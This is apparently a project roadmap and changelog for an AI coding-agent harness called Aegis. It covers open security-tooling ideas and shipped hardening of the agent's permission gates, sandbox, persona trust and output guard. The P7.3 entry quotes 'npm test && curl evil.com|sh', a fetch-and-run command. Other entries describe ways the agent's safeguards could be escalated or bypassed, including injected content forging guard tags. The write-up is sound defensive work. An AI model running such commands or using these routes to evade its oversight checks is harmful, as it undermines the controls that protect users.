# Aegis Capability Roadmap

**Date:** 2026-06-29
**Last updated:** 2026-07-05 — P12 (multi-agent debate mode for security analysis), all 7 items,
shipped. P6.3 (MCP server mode) shipped; P6.2 (A2A), P9.3 (telemetry export), and P9.6 (bulk
session/memory export-import) evaluated and dropped, not wanted.
Full change history and design rationale for every shipped item now lives in
[Appendix A](#appendix-a--completed-work); this document tracks only genuinely open work.

---

## Status

Everything is shipped except the items in the two "Open Work" sections below: P9.4 and P6.1/
P6.5. Every other numbered track — P2, P3, P4, P5 (all sub-items), the TQ TUI-quality track,
P6.3, P6.4, all of P7 (P7.1–P7.7), all of P8 (P8.1–P8.6), P9.1/P9.2/P9.5, the 2026-07-03
architecture/security review's full 15-item punch list, all of P10 (P10.1–P10.5), all of P11
(P11.1–P11.12), and all of P12 (P12.1–P12.7) — is shipped; see
[Appendix A](#appendix-a--completed-work) for what each shipped and why.

**Nothing is currently in progress.** P9.4 and P6.1/P6.5 are real but explicitly not worth
building speculatively — see their entries below for why.

---

## Open Work P13 (Security & Capability Enhancements - Exploratory)

### P13.1 - Trufflehog Secret Scanning Enhancement

Currently gitleaks is used for secret scanning but is not as comprehensive as using trufflehog https://github.com/trufflesecurity/trufflehog. Explore integrating the use of trufflehog into Aegis for secret scanning in project or directory spaces.

### P13.2 - Terminal Enhancements for Aegis

Review the Microsoft Intelligent-Terminal for any features that would be worth incorporating into Aegis. https://github.com/microsoft/intelligent-terminal/tree/main
Intelligent Terminal is built to work with the Agent Client Protocol (ACP)-compatible agent cli. It has certain quality of life features that could be beneficial to use with Aegis. Ensure that anything incorporated into Aegis would be applicable across all operating systems for Windows, Macos and Linux. Focus on identifying any capabilities and features that could be useful and adding those as a new section of roadmap items.

### P13.3 - Nebula AI-Powered Penetration Testing Platform

The Nebula project utilizes llms to help with penetration testing. I want you to assess the project and see if there are any valuable capabilities that can be incorporated into Aegis for security scanning and testing of application code or applications during runtime. Focus on identifying any capabilities and features that could be useful and adding those as a new section of roadmap items.

### P13.4 - Nuclei addition to scanners

Nuclei is a modern, high-performance vulnerability scanner that leverages simple YAML-based templates. It empowers you to design custom vulnerability detection scenarios that mimic real-world conditions, leading to zero false positives. https://github.com/projectdiscovery/nuclei. Review and look at incorporating Nuclei as one of the capabilities used for scanning. That way I can scan systems on my network via aegis, or have it execute the scan and then analyse the results.

### P13.5 - Aegis Threat Modelling

Create a persona that is strictly for threat modelling. I want it to have a focus on STRIDE, LINDDUN, Trike,, Process for Attack Simulation and Threat Analysis (PASTA), VAST with Visual, Agile and Simple Threat Modeling, and the NIST 800-154 data-centric approach to threat modelling that evaluates how sensitive data flows, stores and might be exposed. I want to create a batch of security documents/instructions/skills/etc for each of the types of threat modeling that the agent can clarify with the user what type of threat model they want to enact and then with a focus on the framework, generate a threat model of an application or system. Also review the blog: https://www.securitycompass.com/blog/top-12-threat-modeling-methodologies-techniques/ to see what other important information or methodology for threat modeling should be incorporated. Take note of when each framework is best used and their use-cases. I don't know if Threat Modeling should be a skill bundle or something that can then be loaded into an aegis session and used so that it's not always in the context.

### P13.6 - Latex Report Writing

I want to incorporate Latex use for writing reports. Using LaTeX to write reports means focusing purely on your text and letting the software handle the layout, formatting, and numbering automatically. It is highly recommended for documents with heavy mathematical notations, consistent sectioning, and professional referencing. I want to use Latex to help standardize report writing. I normally have a large number of Markdown documents for research and planning that I want to then consolidate to create a comprehensive report on a subject, this is where I want to use Aegis to extract the relevant information and generate a latex report for it. Latex documentation and core information can be found here: https://www.latex-project.org/help/documentation/. I don't know if report writing should be a skill bundle or something that can then be loaded into an aegis session and used so that it's not always in the context.

---

## Open Work — P9 (Engineering Quality — lower urgency, no current trigger)

P9.1, P9.2, and P9.5 are shipped (see [Appendix A](#appendix-a--completed-work)). P9.3
(telemetry export) and P9.6 (bulk session/memory export-import) were dropped 2026-07-05 —
not wanted (no interest in a telemetry-capturing feature; no need for bulk store
migration). Remaining:

### P9.4 — No per-task/complexity model routing

P5.9 only reroutes on failure. Nothing picks a cheaper model for simple turns and reserves an expensive one for hard turns (cf. Aider). Plausible cheap win given cost tracking already exists, but no evidence of demand. Priority: **Low**, Effort: **M**.

**Not blocking** — real but no concrete trigger, don't build speculatively.

---

## Open Work — P6 (Long-Horizon / Exploratory)

P6.3 (MCP server mode) shipped 2026-07-05 — see [Appendix A](#appendix-a--completed-work).

### P6.1 — Mid-turn state persistence _(was P4.1)_

Persist partial turn state (accumulated assistant text, received tool calls) to SQLite during streaming so a crash mid-turn loses nothing. High complexity, low-probability failure mode; revisit if crash-during-long-turn becomes a reported pain point.

### P6.5 — Desktop / IDE surface beyond ACP

ACP covers Zed and Neovim; the web UI covers browsers. Evaluate: (a) VS Code extension speaking to the daemon API, (b) wrapping the web UI in a lightweight desktop shell. Only worth it if user demand materializes — the TUI is the product.

**Neither P6.1 nor P6.5 is blocking.** P6.1 has no reported pain point; P6.5 is speculative. Don't build either without a concrete trigger — check with the user first. (P6.2, A2A protocol integration, was evaluated and declined 2026-07-05 — no consumer, not wanted.)

---

## Appendix A — Completed Work

<details>
<summary><strong>P2 — all 9 items shipped 2026-07-01</strong></summary>

- P2.1 Ripgrep + `ls` directory tree tool
- P2.2 Bang `!` shell mode in TUI
- P2.3 Frecency-ranked @mention file autocomplete
- P2.4 File-change tracking in sidebar
- P2.5 Subagent footer strip
- P2.6 Max-step graceful degradation
- P2.7 Proactive context compaction (85% headroom check)
- P2.8 Conversation timeline dialog (`/timeline`)
- P2.9 Workflow agent primitives (sequential / parallel / loop)

</details>

<details>
<summary><strong>P3 — all 6 items shipped 2026-07-02</strong></summary>

- P3.1 Tiered long-term memory — SQLite FTS5 entity store (`internal/longmem`); `entity_remember` / `entity_recall` tools; ADK `BaseMemoryService`-compatible interface
- P3.2 Async/background task execution — `/detach` TUI command; daemon persists session to `bg_events` table; `aegis bg list/events` CLI; detached context survives TUI disconnect
- P3.3 DeepWiki-style project knowledge base — SQLite FTS5 index of docs/comments (`internal/knowledge`); `project_knowledge` tool with BM25 ranking and snippet extraction
- P3.4 Automatic rollback on tool failure — `git_sha` captured per checkpoint; `/rollback` TUI command runs `git reset --hard <sha>`; `GitRollback` flag on `RewindRequest`
- P3.6 Typed tool output schemas — optional `OutputSchemer` interface on `Tool`; `OutputSchema json.RawMessage` on `ToolSchema`; all built-in tools declare output schemas
- P3.7 Animation pause off-screen — spinner tick suppressed when `followBottom` is false; animation resumes automatically on scroll-back

</details>

<details>
<summary><strong>P4 — Core Harness Parity, all 6 items shipped 2026-07-02</strong></summary>

- P4.3 Skills progressive disclosure — `internal/skills` now injects a compact `<skills_available>` index (name + frontmatter `description:`); a `skill` builtin tool loads the full body on demand. Description-less skills fall back to eager injection.
- P4.3 extension (2026-07-04) — five skills embedded in the binary (content-review, html-report ported from `.aegis/skills`; security-audit, architecture-diagram, debug-investigation newly written) via `go:embed` in `internal/skills/builtin`, materialized to `<data_dir>/builtin-skills/` at daemon startup. Dormant by default (zero system-prompt cost); enabled per-name via `skills.builtin_enabled` config (project overrides global overrides built-in on a name collision), `aegis skills enable|disable|list` CLI, or `/skills enable|disable <name> [global]` TUI. Also fixed: `internal/memory`'s `loadSkills()` was eagerly re-injecting full (unstripped-frontmatter) skill bodies into the system prompt in parallel with `skills.BuildIndex`, which both duplicated bundled-skill content and silently bypassed progressive disclosure for any flat `.md` skill file with a `description:` — removed, `internal/skills` is now the single injection path.
- P4.4 User-configurable lifecycle hooks — `hooks:` config maps `pre_tool_use`/`post_tool_use`/`session_start`/`stop`/`subagent_stop` to shell commands (`internal/hooks` `Exec`); JSON event on stdin, exit 2 vetoes with stderr surfaced.
- P4.5 Headless structured output — `aegis chat --output-format text|json|stream-json`.
- P4.6 Deferred tool loading — `tool.Registry` gained `RegisterDeferred`/`Deferred`/`Load`/`SearchDeferred`; niche tools (latex, diagram, cron, lsp, longmem, team) are advertised as a `<deferred_tools>` one-liner and loaded via the `tool_search` meta-tool.
- P4.7 OS-level sandbox — `sandbox.backend: os` confines the local shell via macOS seatbelt / Linux bwrap; reported by `aegis sandbox detect`.
- P4.8 Close the loop — `git_pr` tool pushes the branch and opens a PR via `gh`, with a GitHub compare-URL fallback.

</details>

<details>
<summary><strong>P5 — all 9 items shipped 2026-07-02</strong></summary>

- P5.1 Agent teams — SQLite-backed shared task list (`swarm.TaskList`, `team_task_*` tools with atomic claim) + peer messaging (`team_send`/`team_inbox` over the file mailbox).
- P5.2 LSP tools — added `definition`, `hover`, `document_symbols`, `workspace_symbols`, `call_hierarchy` (registered deferred).
- P5.3 Pluggable web search — `search:` config selects brave/tavily/searxng; DuckDuckGo scrape remains the zero-config fallback.
- P5.4 Background notifications — `notify:` config fires desktop (osascript/notify-send/toast) and/or webhook on background-session completion/error.
- P5.5 @file#L10-40 line-range mentions — server expands `@path#L10-40` tokens in user messages to inline file excerpts before the engine call.
- P5.6 Draft stash — unsent textarea content saved to `.aegis/stash.json` on quit; restored on next session start.
- P5.7 Bundle install from git URL — `aegis bundle install/info <git-url>` clones `--depth=1` to temp dir and installs as a normal local bundle.
- P5.8 Semantic recall layer — `internal/embed` (Ollama `/api/embed` client, cosine similarity, reciprocal-rank fusion); `knowledge.Store` and `longmem.Store` gained an optional `Embedder` and a `docs_vec`/`mem_vec` BLOB vector table; `Search`/`SearchMemory` fuse BM25 + semantic rankings via RRF when `embeddings.enabled: true`, else BM25-only (default). `aegis knowledge index` CLI command added. Along the way, fixed a real gap: `knowledge.Store`/`longmem.Store` were built but never opened by the daemon — `project_knowledge`/`entity_remember`/`entity_recall` were dead tools; now wired into `internal/server`.
- P5.9 Provider failover — `provider.WithFailover` chains a primary adapter with ordered fallback targets, switching only on synchronous Stream failure after each target's own retry budget is exhausted (never mid-stream, so no partial output is replayed). `provider.fallback` config (ordered provider/model/base_url entries) + `provider.allow_cloud_fallback` guard: local→cloud failover is skipped with a warning unless explicitly opted in; cloud→cloud and any→local are never gated. `providerfactory.Build` assembles the chain.

</details>

<details>
<summary><strong>P7.1 — MCP capability laundering fixed, shipped 2026-07-03</strong></summary>

- `mcp.ServerConfig` gained `capability` (per-server default) and `tool_capabilities` (per remote tool name override) config fields; `internal/config.MCPServerConfig` and `internal/server` wiring pass them through.
- `internal/mcp/tool.go`: `mcpTool`/`mcpResourceListTool`/`mcpResourceReadTool`/`mcpPromptListTool`/`mcpPromptGetTool` all carry a resolved `tool.Capability` field instead of hardcoding `tool.CapNetwork`; `resolveCapability`/`parseCapability` default anything unlabeled/unrecognized to `tool.CapExecute` (most restrictive), matching the existing `internal/plugins` process-tool pattern.
- Net effect: an unlabeled or untrusted MCP server's tools now hit the `Ask` gate in build mode and are denied outright in plan mode, instead of the always-allowed `network` capability. Trusted servers opt back into `network` (or any other class) explicitly per-server or per-tool.
- Tests: `internal/mcp/mcp_test.go` — `TestParseCapabilityDefaultsToExecute`, `TestResolveCapabilityPerToolOverride`, `TestResolveCapabilityDefaultsExecuteWithNoConfig`.
- Docs updated: `docs/configuration.md` (MCP server example with `capability`/`tool_capabilities`), `docs/security.md` (`egress_then_write` network-capability description).

</details>

<details>
<summary><strong>P7.2–P7.7 — remaining security-hardening audit items, shipped 2026-07-03</strong></summary>

- **P7.2 (shell env leak):** `internal/sandbox/env.go` (new) strips `ANTHROPIC_API_KEY`/`OPENAI_API_KEY` (`DefaultStripEnv`) from `cmd.Env` in both `LocalBackend` and `OSBackend` (`local.go`, `os_sandbox.go`); `sandbox.strip_env` config (`config.SandboxConfig.StripEnv`) adds more names (e.g. MCP tokens from `.aegis/.env`) via `NewLocalBackendWithEnv`/`NewOSBackend`'s new param. Container backend untouched — `docker run`/`podman run` never passed host env into the container to begin with.
- **P7.3 (exec allow-rule chaining bypass):** `internal/permission/rules.go` adds `globToRegexpExec` — for an `allow` rule scoping an execute-capability tool, `*`/`?` cannot span shell chaining/substitution chars (`;&|`+"`"+`$()<>`+ newline), so`allow bash(npm test*)`no longer matches`npm test && curl evil.com|sh`. Deny rules deliberately keep the original broad `.*` (over-matching on deny is safe).
- **P7.4 (silent sandbox fallback):** sandbox backend selection extracted to standalone `server.selectSandbox` (testable in isolation); `sandbox.strict` config makes a failed `container`/`os` backend init a hard startup error instead of silently falling back to local. Non-strict fallback is recorded on `Server` and surfaced via `/healthz` (`api.HealthStatus.SandboxFallback`); `client.Status()` + `cli.warnSandboxFallback` print a warning banner in the TUI/`aegis ui` before entering a session.
- **P7.5 (persona mode escalation):** `persona.Persona` gained a `Loaded bool` field (true only for `*.md`-parsed personas, never built-ins); `server.resolveSessionMode` ignores a loaded persona's `mode: auto` when it's more permissive than the configured default and the caller didn't explicitly request a mode, logging a warning instead. Built-in personas remain fully trusted.
- **P7.6 (no bundle provenance check):** `bundle.Bundle.ContentHash()` computes a deterministic `sha256:`-prefixed digest over the manifest + every artifact file; `aegis bundle info` prints it, `aegis bundle install --expect-sha256 <hash>` aborts before writing anything on mismatch. Trust-on-first-use pinning, not a signature.
- **P7.7 (silent no-op deny rules):** `permission.WarnUnmatchableRules` (called once at startup against `tool.Registry.All()`, a new method) flags any non-`*`-pattern rule targeting a tool whose input schema has none of `subjectFor`'s recognized fields (`command`/`path`/`file_path`/`url`/`query`/`pattern`) — such a rule can never match, so it's logged instead of silently no-op'ing.
- Docs: `docs/configuration.md`, `docs/security.md`, `docs/permissions.md`, `docs/personas.md`, `docs/extensibility.md` all updated with the new config knobs/flags and their security rationale.

</details>

<details>
<summary><strong>P8 — Performance audit findings, all 6 items shipped 2026-07-03</strong></summary>

- **P8.1 (session store O(N²) rewrite):** `internal/session/session.go` gained `session_messages`/`session_traces` row-per-message/row-per-trace tables. `AppendMessages` (new) and `AppendTraces` (rewritten) now pure-`INSERT` new rows keyed by an incrementing `seq`, no more read-modify-write of the whole blob; `SaveMessages` keeps full-replace semantics (delete + reinsert) for the rewind/truncation case where earlier history itself changes. A one-time `migrateLegacyBlobs` backfills any pre-P8.1 whole-blob `messages`/`traces` columns into the row tables on first `Open()` after upgrade, then zeroes the legacy columns so it's a no-op on every later startup. `engine.Conversation` gained a `Persisted int` field (count of already-durable leading messages; `-1` means "rewritten in place, must fully re-save") that `repairOrphanedToolUses`/compaction reset via a new `invalidate()` helper; `server.go`'s per-turn save now calls `AppendMessages(conv.Messages[conv.Persisted:])` on the common path and only falls back to full `SaveMessages` when history was actually rewritten this turn. `Delete`/`Prune` clean up the new row tables too.
- **P8.2 (knowledge search full-corpus load):** `internal/knowledge/knowledge.go`'s `semanticRanking` now queries `docs_vec` (path+vector only) for the scoring pass, then a new `fetchSnippets` runs a second `WHERE path IN (...)` query for just the top-K survivors' title/body — no more pulling every document's full body into memory to rank.
- **P8.3 (swarm mailbox unbounded growth):** `internal/swarm/mailbox.go`'s `MarkRead` now moves the message file into a `processed/` subdirectory (instead of rewriting its `read` flag in place); `ReadAll(unreadOnly=true)` — the hot poll path used by the `team_inbox` tool — only lists the inbox directory, which now shrinks as messages are consumed instead of growing forever. `ReadAll(false)` still merges in `processed/` for full-history callers.
- **P8.4 (token estimation double-scan):** `engine.Conversation` gained a cached `estimatedChars()`/`charCountValid` pair; `Append` updates the cache incrementally, and anything that rewrites history calls the same `invalidate()` used by P8.1 to force a full recompute on next access. The two `estimateTokens` call sites (proactive-compaction check, zero-usage fallback) now share one scan per turn instead of two, and normal turns pay zero extra scan cost.
- **P8.5 (memory relevance TF-IDF recompute):** `internal/memory/relevance.go` gained `cachedEntries()` / `relevanceSnapshot`, keyed on a cheap `entriesSignature()` fingerprint (mtime+size per memory/skill file, no content read) stored on the existing `sourcesCache` (from `NewSources`); `allEntries()`/document-frequency build only reruns when a source file actually changed. `LoadRelevant` copies the cached entries before scoring so concurrent/sequential queries never mutate the shared cache.
- **P8.6 (execLock over-serializes reads):** `internal/engine/engine.go`'s `runTools` swapped `execLock sync.RWMutex` for a plain `sync.Mutex` taken only by write/execute tool calls; read/network calls no longer take any lock and run fully concurrently with a same-round write/execute call instead of blocking behind it.
- Tests: `internal/session/session_test.go` (`TestAppendMessagesIsIncremental`, `TestAppendMessagesMissingSession`, `TestSaveMessagesTruncates`, `TestDeleteRemovesMessageAndTraceRows`, `TestLegacyBlobMigration`), `internal/swarm/mailbox_test.go` (`TestMarkReadEvictsFromInbox`), `internal/memory/relevance_test.go` (`TestLoadRelevantCacheInvalidatesOnFileChange`).

</details>

<details>
<summary><strong>P9.1/P9.2/P9.5 — Eval harness, test coverage, spend caps, shipped 2026-07-03</strong></summary>

- **P9.1 (eval/regression harness):** new `internal/eval` package. A `Scenario` (system prompt + fully-built `engine.Options` + a sequence of user turns) runs against a real `engine.Engine` wired with a scripted/deterministic `provider.Adapter` — no live model, so it's part of `go test ./...` with no API key required. `Check` functions (`ExpectToolCalled`, `ExpectToolNotCalled`, `ExpectNoError`, `ExpectErrorContains`, `ExpectFinalTextContains`) assert on the `Result`; `AssertGolden` pins a deterministic JSON transcript per scenario under `internal/eval/testdata/`, regenerated via `AEGIS_EVAL_UPDATE=1 go test ./internal/eval/...`. Four scenarios ship as the initial suite (`internal/eval/scenarios_test.go`): a tool-call round trip (golden-pinned), plan-mode denying a write tool before `Execute` ever runs, a cost-budget abort stopping before its second turn, and multi-turn conversation continuity across two user turns. This exercises the interaction between engine, permission gate, and tool registry the way a real session would — regressions that only show up when those mechanisms combine won't necessarily trip a narrower per-mechanism unit test.
- **P9.2 (test coverage for trace/logging/api/client):** `internal/trace`, `internal/logging`, `internal/api`, `internal/client` all gained `_test.go` files (previously zero coverage). `internal/api`'s tests lock the on-the-wire `EventKind` strings and round-trip every wire type, since a silent rename there breaks the TUI/CLI without a compile error. Writing `internal/logging`'s tests surfaced a real bug: `ToStderr: true` with a `Path` set was replacing file output with stderr-only instead of mirroring both (contradicting the field's own doc comment) — fixed with `io.MultiWriter`, which is what `aegis serve --foreground` needs to keep a durable log file while also printing to the terminal.
- **P9.5 (spend caps):** `internal/config.CostConfig` gained `session_cap_usd` and `daily_cap_usd` (0 = unlimited, same convention as the existing `budget_usd`) plus `alert_threshold` (fraction, default 0.8). `internal/session.Store` gained a `daily_cost` table (`AddDailyCost`/`TodayCost`, keyed by UTC date) since the existing per-session `cost_usd` column can't answer "how much across all sessions today." `server.handlePostMessage` checks both caps before starting a turn (rejecting with 402 rather than the existing mid-run `budget_usd` abort, which is per-turn only) and emits a new `api.KindCostAlert` SSE event the turn that crosses `alert_threshold` of either cap (rendered in the TUI like the existing guard warning). This is additive to the pre-existing `budget_usd` single-run abort, not a replacement.
- Tests: `internal/eval/scenarios_test.go` (4 scenarios + golden transcript), `internal/api/api_test.go`, `internal/trace/trace_test.go`, `internal/logging/logging_test.go`, `internal/client/client_test.go`, `internal/session/session_test.go` (`TestTodayCostDefaultsToZero`, `TestAddDailyCostAccumulates`), `internal/server/server_test.go` (`TestSessionCostCapBlocksTurn`, `TestDailyCostCapBlocksTurn`, `TestCostAlertThresholdFires`).

</details>

<details>
<summary><strong>Persona QoL pass — advisory tool gate, CLI, default persona, shipped 2026-07-03</strong></summary>

Not a numbered roadmap item — a follow-through pass closing gaps left by the P7.5 persona-trust model and earlier persona hot-reload/full-profile-switch work.

- **`permission.PersonaToolGate`** (`internal/permission/persona_tools.go`, new): wraps the base gate with an advisory check against a persona's declared `Tools` list. Deliberately not a security boundary (same trust model as P7.5) — a tool call outside the list is logged and routed through the session's `Approver`: a non-interactive approver (e.g. auto mode) warns and allows, the TUI's interactive approver prompts and reuses its session-scoped allow-always cache. Declining blocks that call; approving (or an empty `Tools` list) always falls through to the real base gate.
- **`aegis persona` CLI** (`internal/cli/persona.go`, new): `list` (built-in/custom/default markers), `show <name>` (source, model, mode, tools, rules, guard, prompt; `--full` for the entire prompt), `new <name>` (scaffolds a commented frontmatter template, `--global` for the user directory), `use <name>` (writes `default_persona` to project or `--global` user config).
- **`default_persona` config** (`internal/config`): a new session with no explicit `--persona` resolves project `default_persona` → user-global `default_persona` → `general`. `config.PatchProjectDefaultPersona`/`PatchGlobalDefaultPersona` back the CLI's `use` subcommand.
- **Full-profile mid-session persona switch**: `api.UpdateSessionRequest` gained `Persona`; `/persona` in the TUI now switches the persisted persona name (so model/rules/guard re-resolve every turn, not just the system prompt) and applies the persona's default permission mode when the user hasn't set one explicitly, reporting the mode change.
- **Output guard rubric refinement**: `DefaultGuardRubric` and the `--first-init` template now explicitly excuse clearly-marked example/placeholder values in documentation (illustrative IPs, `<your-api-key>`-style tokens) from the "no placeholders" check, since those are legitimate and the real value was never supplied to the model.
- Tests: `internal/permission/persona_tools_test.go`, `internal/cli/persona_test.go`, `internal/config/write_persona_test.go`, plus updates to `internal/persona/load_test.go`, `internal/persona/persona_test.go`, `internal/server/server_test.go`.
- Docs: `README.md`, `CLAUDE.md`, `docs/cli-reference.md`, `docs/configuration.md`, `docs/personas.md` all updated in the same commit.

</details>

<details>
<summary><strong>P6.4 — Context editing / tool-result pruning, shipped 2026-07-03</strong></summary>

`compaction.pruneStaleToolResults` (`internal/compaction/prune.go`) runs as a deterministic pre-pass inside `Summarizer.Compact`, before any LLM call: `read_file` results for a path that was read again later are blanked to a one-line marker, and large `grep`/`glob`/`ls` dumps outside the trailing `keepRecent` window are truncated to a short preview. Never touches conversational text, tool errors, or the recent window. If pruning alone brings the estimate back under budget, `Compact` returns immediately — no summarizer call, no LLM cost.

</details>

<details>
<summary><strong>P6.3 — MCP server mode, shipped 2026-07-05</strong></summary>

New `internal/mcpserver` package + `aegis mcp-serve`: exposes the Aegis daemon as an MCP server over stdio, the reverse direction of the existing `mcp:` client config (which lets Aegis call _out_ to external MCP servers). Rolls its own minimal JSON-RPC 2.0 dispatcher (request/notification, no server-initiated calls needed) rather than sharing `internal/acp`'s — same precedent as `internal/mcp`'s client-side loop already being separate from ACP's.

- Three tools exposed: `aegis_prompt` (delegate a task to a session and block for the full turn, returning the final assistant text plus a `[session: <id>]` marker to continue the conversation), `aegis_new_session`, and `aegis_list_sessions`. All three are thin translations onto the existing daemon HTTP API (`client.Client`), exactly how `internal/acp`'s agent already works — no new server-side session/engine plumbing.
- Safety posture is deliberately conservative since an MCP `tools/call` is synchronous with no human in the loop: new sessions default to **plan mode** (`mcp_server.default_mode`, not the daemon's own build default) and any approval request that does arise (a caller explicitly asked for build/auto) is **denied** unless `mcp_server.auto_approve` (or `--auto-approve`) is set.
- **Scope decisions kept deliberately narrow:** individual built-in tools (`security_scan`, `read_file`, etc.) are not exposed 1:1 as MCP tools bypassing the agent loop — undone follow-up, not an oversight. `notifications/cancelled` is not propagated to an in-flight `aegis_prompt` call.
- Verified end-to-end against a real running daemon (built the binary, drove `aegis mcp-serve` over stdio by hand: `initialize` → `tools/list` → `tools/call aegis_new_session`/`aegis_list_sessions`), not just unit-tested.

Tests: `internal/mcpserver/server_test.go` (14 cases: initialize, tools/list schema shape, prompt session-create vs. reuse, approval deny-by-default vs. auto-approve, error propagation, empty/populated session listing, unknown tool/method, notification-gets-no-response). Docs: `docs/cli-reference.md`, `docs/configuration.md`, `CLAUDE.md`.

</details>

<details>
<summary><strong>TQ — TUI Quality Track, all 11 items shipped (complete 2026-07-03)</strong></summary>

A code-level review of `internal/tui` against the Claude Code and opencode/Crush TUI experience found the recurring gap: Aegis rendered the conversation as one append-only styled string (`cappedBuffer` + wrap caches), while the streamlined harnesses model it as a list of typed message blocks rendered and cached individually. TQ1 fixed that structural gap; the rest is diff quality, streaming markdown, and interaction polish.

| #      | Item                                                                                                                                                                                                                                                                                                                                                                                                                             | Shipped    |
| ------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- |
| TQ1    | Block-based transcript model — `internal/tui/transcript.go`: `transcriptBlock` (raw ANSI content + per-block width-keyed wrap cache) replaces the old whole-buffer `cappedBuffer`/`wrapCache`; `liveBlock` keeps the settled-prefix boundary-cache trick so a long streaming reply stays O(tail) per token. Trimming drops whole blocks instead of severing content mid-line.                                                    | 2026-07-02 |
| TQ2    | Real unified diffs — LCS-based Myers diff in `toolview.go`; context lines, `+`/`-` markers, `@@ ... @@` separators between hunks. Replaces delete-all/add-all.                                                                                                                                                                                                                                                                   | 2026-07-02 |
| TQ4a/b | Copy affordances — `/copy` copies last assistant message via `pbcopy`/`xclip`/`clip.exe`; `/copy N` copies Nth fenced code block; toast confirmation.                                                                                                                                                                                                                                                                            | 2026-07-02 |
| TQ5    | Toggleable sidebar — `sidebarOpen bool` (default off); `ctrl+b` / `/sidebar` toggle; context %, cost, agent count folded into status bar when hidden.                                                                                                                                                                                                                                                                            | 2026-07-02 |
| TQ7    | Live todo strip — intercepts `todo_add`/`todo_update`/`todo_list` tool results; renders `▣▶▢` progress strip above input with in-progress task text.                                                                                                                                                                                                                                                                             | 2026-07-02 |
| TQ3    | Streaming markdown — the live tail renders through glamour incrementally: `liveBlock.render` takes a markdown-render callback, trailing newlines normalized so settled-prefix + tail concatenation is byte-identical to a whole-source render. No end-of-turn restyle "pop".                                                                                                                                                     | 2026-07-03 |
| TQ9    | Input polish bundle — `shift+enter` newline (Kitty key disambiguation, `ctrl+j` fallback); pasted image paths become `@image:` attachment tokens (`extractImageRefs`, regex-based, quoted-path support); ↑/↓ move the cursor inside a multiline draft with history nav only at first/last line; thinking blocks collapse to `✻ thought for Ns` (`ctrl+o` to expand).                                                             | 2026-07-03 |
| TQ8    | Message queueing — `alt+enter` during streaming queues the draft as the next user turn (dimmed `⏳ queued ▸` block); queued messages auto-send one per completed run at stream close. Explicit cancel or a stream error discards the queue.                                                                                                                                                                                      | 2026-07-03 |
| TQ6    | Richer approval flow — y/a/n banner replaced by an option-list dialog (`internal/tui/approval.go`): `Allow once / Allow always for pattern / Deny / Deny with feedback`, diff/command preview. "Allow always" derives a scoped pattern (`suggestRulePattern`) and persists it to `.aegis/config.yaml → permission.rules` (`config.AppendProjectPermissionRule`). "Deny with feedback" steers the typed reason back to the model. | 2026-07-03 |
| TQ10   | Theme system — the hardcoded Charmtone palette moved behind `colorScheme` (`internal/tui/colorscheme.go`) with `darkScheme`/`lightScheme` built-ins; `tui.theme` config key applied before styles are built; glamour markdown style and ANSI-16 shell-output remap follow the scheme.                                                                                                                                            | 2026-07-03 |

Remaining cosmetic stretch ideas (not scheduled): TQ4c scoped mouse capture, terminal-background auto-detection for theme selection.

</details>

<details>
<summary><strong>Architecture/security review punch list — all 15 items shipped 2026-07-04</strong></summary>

Fixes for every item in `research/architecture-security-review-2026-07-03.md`'s prioritized punch list, an adversarial fresh-context review (five independent passes) run specifically to find interaction bugs between individually-correct features — the class of bug a checklist re-verification against P7/P8/P9 structurally can't catch. All 15 shipped in priority order; full test suite green throughout.

1. **Persona `rules:` escalation** — `server.filterPersonaRules` (new, `internal/server/server.go`) strips `Allow` rules from a loaded (untrusted) persona before merging into the session rule set, same trust gate `resolveSessionMode` already applied to `Mode` (P7.5). Deny rules pass through unchanged (narrowing access carries no escalation risk).
2. **Persona `output_guard: none` escalation** — `outputGuardConfig` now ignores `Guard.Disabled` from a loaded persona (logs a warning instead), closing the same class of gap for the last safety net.
3. **Unrecovered tool-panic crashes the daemon** — `engine.runTools`' per-call goroutine now `recover()`s a panic and reports it as an ordinary tool error, instead of taking down every concurrent session.
4. **Sub-agent fan-out multiplies spend** — a shared `*cost.Tracker` rides the run's `ctx` (`swarm.WithCostTracker`/`CostTrackerFromContext`) so every sub-agent at any depth (including background/detached spawns, and workflow-mode fan-out) draws against one `BudgetUSD` ceiling; `agent.go` also caps a `parallel` workflow at `maxParallelAgents` (8).
5. **Rewind races an in-flight turn** — `handleRewind` now acquires the same per-session semaphore `handlePostMessage` does, so a rewind can never truncate messages a concurrent turn is about to append to.
6. **Permission rules matched raw paths** — `permission.Rule` gained a `rePath` matcher; `normalizePathLike` (separator-unify + lexical clean + case-fold on case-insensitive OSes) closes the `./secrets/x`, case-variant, and backslash-vs-forward-slash evasions for Read/Write-capability rules.
7. **Transcript persistence wasn't actually incremental** — `handlePostMessage`'s `flushMessages` closure now runs on every `KindTurnDone`/`KindTrace` event (after each tool round), not once at the very end, so a crash mid-run loses at most the in-flight model call.
8. **Guard fails open on ambiguous verdicts + no injection hardening** — `parseVerdict` now fails _closed_ on an unparseable reply (an actual transport error still fails open); `LLMGuard` wraps judged content in `<output>`/`<file>` tags with `escapeForGuard` neutralizing embedded angle brackets, so injected content can't forge a fake closing tag and splice in "instructions."
9. **MCP read loops die silently on oversized/malformed input** — `readLoop`/`listenSSE` scanners raised to `maxMCPScanTokenBytes` (8 MiB, from bufio's 64KB default); `Client.failPending` fails every in-flight and future call immediately once the read loop exits, instead of hanging forever on a dead connection.
10. **OpenAI reasoning models get the wrong token-limit field** — `isReasoningModel` routes o1/o3-class models (including vendor-prefixed ids) to `max_completion_tokens` instead of `max_tokens`, which those models reject outright.
11. **OS sandbox overstates its guarantee** — `docs/security.md`/`docs/configuration.md` now document (and `OSBackend`'s doc comment states) that seatbelt/bwrap confine writes and network only, not reads — a materially weaker claim than the container backend's full isolation.
12. **Budget dead zones + loop-detector blind spot** — the budget check now runs at the top of every engine iteration (covering guard retries and max-token continuations, not just the pre-tool-round path); `loopDetector` generalizes from "last N identical" to cycle detection up to period 4 (catches an alternating A/B pattern), and `turnSignature` canonicalizes tool input (normalizing timestamp/UUID/nonce-shaped scalars) so a single varying byte can't defeat it.
